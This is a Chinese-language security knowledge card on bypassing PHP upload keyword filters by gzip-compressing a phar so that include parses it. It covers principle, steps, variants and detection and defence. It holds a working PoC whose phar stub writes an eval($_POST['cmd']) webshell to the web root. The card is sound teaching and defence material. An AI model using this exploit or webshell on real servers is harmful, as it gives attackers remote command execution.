---
id: web-php-deserialization-compressed-phar-include-bypass
title: PHP include 解析压缩 phar 容器绕过关键字过滤并写马
type: scenario
domain: web
path: web/php/deserialization
technique: compressed-phar-include-bypass
aliases:
- phar.gz 包含
- 压缩 phar 绕过
- include phar 容器
- phar 关键字过滤绕过
- phar 写马
tags:
- php
- phar
- file-inclusion
- deserialization
- compression
- waf-bypass
- webshell
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:27:40+08:00'
  notes: 已对照原文与截图 7-12、21 核对：include 文件名含 .phar 触发 phar_open_from_fp、gzip 后关键字消失、上传后 include 解压解析 stub 写 shell.php 并最终取 flag；原文一次失败因序列化 O/0 笔误，修正后成功，medium 合适
---

## 一句话结论

当上传/包含逻辑用扩展名或明文关键字过滤 `<?php`、`__HALT_COMPILER`、`PK` 等特征时，可把带恶意 stub 的 phar 用 gzip/bzip2 压缩后上传；PHP 的 `include` 只要文件名含 `.phar` 就会调用 phar 解析器，自动解压并解析容器，从而绕过关键字检测并执行 stub/写马。

## 原理

- PHP 编译器在处理 `include` 时调用 `zend_compile_file`；如果文件名包含 `.phar`，会调用 `phar_open_from_filename`/`phar_open_from_fp` 按 phar 容器解析。
- `phar_open_from_fp` 不只看扩展名：它会尝试 rewind，判断 gzip/bzip2/zip/tar 容器并解压，然后扫描 `__HALT_COMPILER();`，找到后按 phar 结构解析。phar 本质是容器格式，不是由后缀唯一决定的。
- gzip 压缩后的 phar 字节流中不再出现明文的 `<?php`、`__HALT_COMPILER`、`PK` 等关键字，能绕过只做明文/后缀黑名单的上传过滤；`include('xxx.phar.gz')` 时 PHP 自动解压并当作 phar 解析。
- phar 的 stub 是容器入口；当文件被 include/解析时，stub 中的 PHP 代码可以执行（例如写入 `shell.php`）。如果 phar 带 metadata，`phar://` 包装器还会触发 metadata 反序列化（经典 phar deserialization）。
- 成立前提是文件名/路径包含 `.phar`（如 `.phar.gz`、`.phar.png`、`.phar.zip`），且攻击者能控制 include 的路径；创建 phar 需要本地 `phar.readonly=Off`。

## 触发条件

- 存在文件上传 + 后续 `include`/`require` 用户可控路径的功能。
- 上传过滤只检查明文关键字/后缀，未在解压后检查内容，也未禁用 phar。
- 文件名/路径可包含 `.phar`（或可通过重命名/路径拼接满足）。
- 攻击者能在本地生成 phar 并压缩（PHP 环境 `phar.readonly=Off`）。

## 利用步骤

1. 本地生成 phar：设置 stub（写入 shell.php 或执行命令），添加任意文件，stopBuffering。
2. 用 gzip/bzip2/zip/tar 压缩 phar，得到 `exp.phar.gz` 等；确认压缩后字节中不含被过滤的关键字。
3. 上传压缩包，绕过关键字/后缀检测。
4. 触发 `include` 指向该文件（路径需含 `.phar`），PHP 解压并按 phar 解析，执行 stub。
5. 访问写入的 shell.php 或观察命令执行结果。

## PoC

```php
<?php
// 本地生成 phar（phar.readonly=Off）
$p = new Phar('exp.phar');
$p->startBuffering();
$stub = <<<'STUB'
<?php
system('echo "<?php eval(\$_POST[\'cmd\']); ?>" > /var/www/html/shell.php');
__HALT_COMPILER();
?>
STUB;
$p->setStub($stub);
$p->addFromString('a.txt', 'aaaa');
$p->stopBuffering();
```

```bash
# 压缩，绕过明文关键字过滤
gzip -c exp.phar > exp.phar.gz

# 上传 exp.phar.gz 后，触发 include（路径含 .phar）
# include('/tmp/xxxx.phar.gz');
```

```text
# 预期：stub 执行，/var/www/html/shell.php 被写入；
# 访问 shell.php 执行命令。
```

## 变体与关联

- 变体：`.phar.png`、`.phar.html`、`.phar.tar`、`.phar.zip` 等，只要文件名含 `.phar` 即可被 phar 解析器识别；压缩格式可为 gzip/bzip2/zip/tar。
- 变体：不执行 stub，改为在 phar metadata 中放入反序列化 gadget，通过 `phar://` 触发（经典 phar deserialization）。
- 变体：上传过滤在解压后检查内容时，可改用二次压缩/多层容器或加密字节，但需目标解析器支持。
- 关联：[[web-generic-file-upload-archive-symlink-extract-read-write]]（压缩包解压的另一类风险）；[[web-php-file-inclusion-filter-chain-fileless-rce]]（PHP 文件包含的无文件利用）。
- 边界：目标禁用 phar、`include` 路径不可控、文件名无法包含 `.phar`、或上传后在解压内容上做严格检查时，本场景不成立。案例中一次 include 因序列化字符串笔误失败，修正后成功；卡片 confidence 标 medium。

## 检测与防御

- 检测：监控上传文件中 gzip/bzip2/zip/tar 魔数且文件名含 `.phar`；监控 `include` 路径指向上传目录；审计 `phar_open_from_fp`/`__HALT_COMPILER` 相关行为。
- 修复：禁用 `phar://` 包装器/不解析用户上传的 phar；上传后解压检查真实内容，不只查明文关键字；禁止 include 用户可控路径。
- 加固：`phar.readonly=On`（默认）阻止运行时生成 phar；上传目录不可执行；使用白名单扩展名 + 内容魔数校验；WAF 检测压缩容器中的 phar 结构。
